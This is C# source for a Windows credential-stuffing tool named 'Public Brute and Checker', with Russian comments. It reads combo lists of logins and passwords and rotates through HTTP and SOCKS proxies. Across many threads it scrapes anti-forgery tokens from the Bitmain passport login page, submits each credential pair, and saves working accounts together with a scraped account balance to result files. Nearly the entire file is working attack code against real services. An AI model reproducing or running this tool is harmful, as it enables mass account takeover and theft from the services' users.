using System;
using System.Windows.Forms;
using System.IO;
using System.Threading;
using xNet;
using System.Text.RegularExpressions;
using System.Text;
namespace Public_Brute_and_Checker
{

	public partial class FrmMain : MetroFramework.Forms.MetroForm
	{

		public FrmMain()
		{
			InitializeComponent();
			Control.CheckForIllegalCrossThreadCalls = false; // Не дай вам бог решите убрать эту строчку ... 

		}
		bool worck = false;
		Thread th;
		string papka = "RESULT-FOLDER";

		private void btSource_Click(object sender, EventArgs e)
		{
			try
			{

				var FileDialog = new OpenFileDialog(); FileDialog.Filter = "БАЗА (*.txt)|*.txt";
				FileDialog.Multiselect = true;
				if (FileDialog.ShowDialog() == DialogResult.OK)
				{
					Listing.sourceList.Clear();
					foreach (String file in FileDialog.FileNames)
					{
						Listing.sourceList.AddRange(File.ReadAllLines(file));
					}
					btSource.Text = Listing.sourceList.Count.ToString();
					lbLeft.Text = Listing.sourceList.Count.ToString();
					Listing.left = Listing.sourceList.Count;
				}

			}
			catch { }
		}

		private void btProxy_Click(object sender, EventArgs e)
		{
			try
			{
				var FileDialog = new OpenFileDialog(); FileDialog.Filter = "ПРОКСИ (*.txt)|*.txt";
				if (FileDialog.ShowDialog() == DialogResult.OK)
				{
					Listing.proxyList.Clear();
					Listing.proxyList.AddRange(File.ReadAllLines(FileDialog.FileName));
					btProxy.Text = Listing.proxyList.Count.ToString();
				}
			}
			catch { }
		}

		private void btStart_Click(object sender, EventArgs e)
		{

			if (cbProxy.Text == "")
			{
				MessageBox.Show("Не указаны прокси");
			}
			else
			{
				worck = true;
				Listing.threadList.Clear();
				for (int thrcount = 0; thrcount < numThread.Value; thrcount++)
				{

					th = new Thread(Worcher);
					th.IsBackground = false;
					Listing.threadList.Add(th);
					th.Start();
				}
			}
		}

		private void btStop_Click(object sender, EventArgs e)
		{
			worck = false;
			foreach (Thread thread in Listing.threadList)
			{
				thread.Abort();
			}
		}
		private void Worcher()
		{

			while (worck)
			{
				try
				{
					string acc = string.Empty;
					string login = string.Empty;
					string pass = string.Empty;

					lock (Help.lockers)
					{


						if (Listing.sourceList.Count > 0)
						{
							acc = Listing.sourceList[0];
							Listing.sourceList.RemoveAt(0);
						}
						else if (Listing.sourceList.Count == 0)
						{

							break;//Остановка потока если акков в листе не осталось
						}
					}

					if (string.IsNullOrEmpty(acc))
					{
						Thread.Sleep(900);
						continue;
					}
					if (acc.Contains(";"))
					{
						login = acc.Split(';')[0].Trim();
						pass = acc.Split(';')[1].Trim();
					}
					if (acc.Contains(":"))
					{
						login = acc.Split(':')[0].Trim();
						pass = acc.Split(':')[1].Trim();
					}
					Invoke(new MethodInvoker(() =>
					{
						lbLeft.Text = Listing.sourceList.Count.ToString();
						lbGood.Text = Listing.good.ToString();
						lbBad.Text = Listing.bad.ToString();
						lbError.Text = Listing.error.ToString();
						btSource.Text = Listing.sourceList.Count.ToString();
					}));


					// if(pass.Length < 6)
					//   {
					//      DataResult("error", login + ":" + pass); // На случий если нужно будет сортировать пароли по длине .
					//      continue;
					//  }




					Checker(login, pass);

				}
				catch { continue; }

			}
		}
		private void Checker(string login, string pass)
		{


			using (var request = new HttpRequest())
			{
				try
				{
					request.Cookies = new CookieDictionary();
					if (cbProxy.Text == "HTTP/s")
						request.Proxy = HttpProxyClient.Parse(Help.GetProxy());
					if (cbProxy.Text == "SOCKS-4")
						request.Proxy = Socks4ProxyClient.Parse(Help.GetProxy());
					if (cbProxy.Text == "SOCKS-5")
						request.Proxy = Socks5ProxyClient.Parse(Help.GetProxy());
					request.ConnectTimeout = (int)numTyam.Value * 1000;
					request.UserAgent = Http.ChromeUserAgent();
					request.AllowAutoRedirect = false;


					string tokenpars = request.Get("https://passport.bitmain.com/login").ToString();
					Match match = Regex.Match(tokenpars, "<input type=\"hidden\" name=\"_xsrf\" value=\"(.*)\" />");
					Match match2 = Regex.Match(tokenpars, "<input type=\"hidden\" name=\"lt\" value=\"(.*)\" />");
					string xsrf = match.Success ? match.Groups[1].Value : "Не найдено";
					string lt = match2.Success ? match2.Groups[1].Value : "Не найдено";


					request.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8");
					request.AddHeader("Upgrade-Insecure-Requests", "1");

					var reqParams = new RequestParams();

					reqParams["_xsrf"] = xsrf;
					reqParams["username"] = login;
					reqParams["password"] = pass;
					reqParams["lt"] = lt;
					reqParams["service"] = "https://www.bitmain.com/login";

					string authcheck = request.Post("https://passport.bitmain.com/login", reqParams).ToString();

					metroTextBox2.Text = request.Response.StatusCode.ToString();
					
					if (authcheck.Contains("redirect_url"))
					{
						string balance = request.Get("https://www.creagames.com/cabinet/games").ToString();
						match = Regex.Match(balance, "<span id=balanceInGame>(.*)</span>");
						string balancerub = match.Success ? match.Groups[1].Value : "Не найдено";
						DataResult("good","===============\r\n"+ login + ":" + pass + "\r\n Balance : " + balancerub  + "\r\n===============", "good_bal");
					}
					else if (authcheck.Contains("РџРѕС‡С‚Р° РёР»Рё РїР°СЂРѕР»СЊ СѓРєР°Р·Р°РЅС‹ РЅРµРІРµСЂРЅРѕ"))
					{
						DataResult("bad", login + ":" + pass, "bad");
					}
					else
					{
						if (cbError.Checked)
						{
							DataResult("error", login + ":" + pass, "error");
						}
						else
						{
							DataResult("errorr", login + ":" + pass, "error");
						}
					}
				}
				catch (HttpException ex)
				{
					if (cbError.Checked)
					{
						DataResult("error", login + ":" + pass, "error");
					}
					else
					{
						DataResult("errorr", login + ":" + pass, "error");
					}
				}
			}

		}
		private void DataResult(string result, string acc, string file)
		{
			lock (this)
			{
				if (result == "good")
				{
					if (metroCheckBox1.Checked)
					{
						textBox1.Text += acc + Environment.NewLine;
					}
					file = Path.Combine(papka, file + ".txt");
					if (!Directory.Exists(papka))
						Directory.CreateDirectory(papka);
					Listing.good++;
					File.AppendAllText(file + "[" + Help.time + "].txt", acc + "\r\n");

				}
				if (result == "good-balance")
				{
					file = Path.Combine(papka, file + ".txt");
					if (!Directory.Exists(papka))
						Directory.CreateDirectory(papka);
					File.AppendAllText(file + "[" + Help.time + "].txt", acc + "\r\n");
				}
				if (result == "bad")
				{

					Listing.bad++;
				}
				if (result == "error")
				{
					Listing.sourceList.Insert(0, acc);
					Listing.error++;


				}
				if (result == "errorr")
				{
					Listing.error++;
				}

			}
		}

		private void FrmMain_Load(object sender, EventArgs e)
		{
			this.FormBorderStyle = FormBorderStyle.None;

			//MessageBox.Show(time);
			//Checker("albert20707","albatros2");

		}

		private void metroLabel1_Click(object sender, EventArgs e)
		{
			System.Diagnostics.Process.Start("http://aleeek.ru");
		}

		private void FrmMain_FormClosed(object sender, FormClosedEventArgs e)
		{
			System.Diagnostics.Process.GetCurrentProcess().Kill();
		}

		private void button1_Click_1(object sender, EventArgs e)
		{
			
		}

		private void metroButton1_Click(object sender, EventArgs e)
		{
			Checker(metroTextBox1.Text.Split(';')[0], metroTextBox1.Text.Split(';')[1]);
		}
	}
}